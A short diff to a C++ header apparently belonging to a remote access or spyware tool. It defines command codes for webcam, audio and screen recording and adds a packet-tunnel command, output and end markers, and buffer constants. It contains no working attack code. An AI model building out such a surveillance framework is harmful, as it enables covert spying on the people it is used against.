@@ -2,6 +2,7 @@
 #define COMMON_HPP
 
 #include <cstdint>
+#include <limits.h>
 
 typedef uint8_t CommandCode;
 typedef uint16_t Status;
@@ -13,6 +14,7 @@ enum : CommandCode {
     WEBCAM_RECORDER = 0b00001000,
     AUDIO_RECORDER  = 0b00010000,
     SCREEN_RECORDER = 0b00100000,
+    PACKET_TUNNEL   = 0b01000000,
 };
 
 enum : Status {
@@ -22,6 +24,9 @@ enum : Status {
     EXEC_ERROR     = 0x103
 };
 
+#define END_KEY "$^_end"
+#define END_KEY_LEN (sizeof(END_KEY) - 1)
+
 #define OUT_KEY "$^_out"
 #define OUT_KEY_LEN (sizeof(OUT_KEY) - 1)
 #define STATUS_SIZE sizeof(Status)
@@ -29,8 +34,10 @@ enum : Status {
 
 #define TCP_BASED SOCK_STREAM
 #define UDP_BASED SOCK_DGRAM
-#define MAX_COMMAND_LEN 256
+#define MAX_FILE_NAME PATH_MAX
 
-#define TUNNEL_NUMS 4
+#define TUNNEL_NUMS 5
+
+#define BUFFER_SIZE 4096
 
 #endif // COMMON_HPP
